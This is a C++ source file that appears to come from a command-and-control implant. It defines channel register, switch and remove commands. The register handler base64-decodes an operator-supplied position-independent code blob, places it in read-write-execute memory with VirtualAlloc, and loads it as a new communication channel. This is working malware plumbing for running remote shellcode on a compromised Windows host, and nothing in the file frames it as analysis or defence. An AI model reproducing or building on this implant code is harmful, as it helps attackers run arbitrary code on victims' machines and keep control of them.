#include "Command.h"

#include "Channel.h"
#include "Rtlib.h"

// CommandChannelRegister register a user defined channel
//
BOOL CommandChannelRegister( json& args, string artifact, json& result ) {
    DWORD size        = 0;
    BYTE* pic         = NULL;
    BYTE* config      = NULL;
    DWORD config_size = 0;
    BYTE* memory      = NULL;
    json  info        = json::object();

    result["name"] = "channel.register";

    if (artifact.empty()) {
        result["status"] = "failed";
        return FALSE;
    }
    // decode channel pic
    pic = Base64Decode( artifact.c_str(), &size );
    if (pic == NULL) {
        result["status"] = "failed";
        return FALSE;
    }

    // allocate memory to run channel pic
    memory = (BYTE*)VirtualAlloc( NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if (memory == NULL) {
        result["status"] = "failed";
        return FALSE;
    }

    // load channel pic
    if (!ChannelLoad( memory, pic, size )) {
        result["status"] = "failed";
        return FALSE;
    }

    DWORD ID = ChannelRegister(memory, size);
    if (!ID) {
        result["status"] = "failed";
        return FALSE;
    }

    info["id"] = ID;

    result["status"] = "success";
    result["artifact"] = info.dump().c_str();

    return TRUE;
}

// CommandChannelSwitch switch channel
//
BOOL CommandChannelSwitch( json& args, string artifact, json& result ) {
    DWORD ChannelID = 0;
    json  info      = json::object();

    ChannelID = args[0].get<DWORD>();
    result["name"] = "channel.switch";

    if (!ChannelSwitch( ChannelID )) {
        result["status"] = "failed";
        return FALSE;
    }

    info["id"] = ChannelID;

    result["status"] = "success";
    result["artifact"] = info.dump().c_str();

    return TRUE;
}

// CommandChannelRemove remove registered channel
//
BOOL CommandChannelRemove( json& args, string artifact, json& result ) {
    DWORD ChannelID = 0;
    json info = json::object();

    ChannelID = args[0].get<DWORD>();
    result["name"] = "channel.remove";

    if (g_Channel->Interface->ID == ChannelID) {
        result["status"] = "failed";
        return FALSE;
    }

    if (!ChannelRemove( ChannelID )) {
        result["status"] = "failed";
        return FALSE;
    }

    info["id"] = ChannelID;

    result["status"] = "success";
    result["artifact"] = info.dump().c_str();

    return TRUE;
}
